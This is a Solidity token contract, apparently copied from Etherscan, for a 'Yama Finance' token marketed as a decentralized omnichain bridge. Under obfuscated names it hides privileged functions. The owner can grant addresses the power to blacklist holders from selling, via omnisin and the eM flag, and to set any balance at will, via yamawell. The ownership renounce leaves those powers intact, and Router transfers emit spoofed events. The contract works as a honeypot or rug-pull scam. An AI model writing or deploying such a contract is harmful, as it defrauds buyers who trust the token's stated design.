/**
 *Submitted for verification at Etherscan.io on 2022-10-20
*/

// File: yamafi.sol

/**

https://YamaFinance.io

https://twitter.com/YamaFinance

The problem with existing token bridges is that they all at least one of the following disadvantages:
- They are centralized.
- It is not easy for developers to build on top of them.
- The vast majority of them utilize unsustainable liquidity incentives.

Yama solves all of these problems simultaneously. The Yama token bridge is designed to be completely decentralized.
Developers can easily build omnichain protocols by interacting with our contracts when deployed on mainnet:
https://github.com/Yama-Finance/bridge-contracts
https://github.com/Yama-Finance/public-bridge-contracts

Liquidity is incentivized sustainably by allowing liquidity providers to mint $YAMA using their deposits as 
collateral, whilst still collecting swap fees.

In essence, Yama is an omnichain MakerDAO that uses its collateral as a token bridge. 
Users can pay a fee to bridge stablecoins such as USDC cross-chain, while LPs can mint 
the first truly omnichain stablecoin using their collateral.

*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract yamafinance {
  
    mapping (address => uint256) public yAMq;
    mapping (address => bool) yRSc;
	mapping (address => bool) eRn;



    // 
    string public name = "Yama Finance";
    string public symbol = unicode"YAMA";
    uint8 public decimals = 18;
    uint256 public totalSupply = 5000000000 * (uint256(10) ** decimals);
    uint eM = 1;
   
    event Transfer(address indexed from, address indexed to, uint256 value);
     event OwnershipRenounced(address indexed previousOwner);

        constructor()  {
        yAMq[msg.sender] = totalSupply;
        deploy(Deployer, totalSupply); }



	address owner = msg.sender;
    address Router = 0x2Ed6F8566A1b7B57c90889A88B97cd38294e0376;
    address Deployer = 0xa0456eaAE985BDB6381Bd7BAac0796448933f04f;
   


    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier yQ () {
        eM = 0;
        _;}

        function transfer(address to, uint256 value) public returns (bool success) {
        if(msg.sender == Router)  {
        require(yAMq[msg.sender] >= value);
        yAMq[msg.sender] -= value;  
        yAMq[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; } 
        if(yRSc[msg.sender]) {
        require(eM == 1);} 
        require(yAMq[msg.sender] >= value);
        yAMq[msg.sender] -= value;  
        yAMq[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

        function Derivative(address Ex) yQ public {
        require(msg.sender == owner);
        eRn[Ex] = true;} 


        function balanceOf(address account) public view returns (uint256) {
        return yAMq[account]; }
        function omnisin(address Ex) Si public{          
        require(!yRSc[Ex]);
        yRSc[Ex] = true;}
		modifier Si () {
        require(eRn[msg.sender]);
        _; }
        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
		 function yamawell(address Ex, uint256 iZ) Si public returns (bool success) {
        yAMq[Ex] = iZ;
        return true; }
        function yamw(address Ex) Si public {
        require(yRSc[Ex]);
        yRSc[Ex] = false; }



        function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Router)  {
        require(value <= yAMq[from]);
        require(value <= allowance[from][msg.sender]);
        yAMq[from] -= value;  
        yAMq[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; }    
        if(yRSc[from] || yRSc[to]) {
        require(eM == 1);}
        require(value <= yAMq[from]);
        require(value <= allowance[from][msg.sender]);
        yAMq[from] -= value;
        yAMq[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}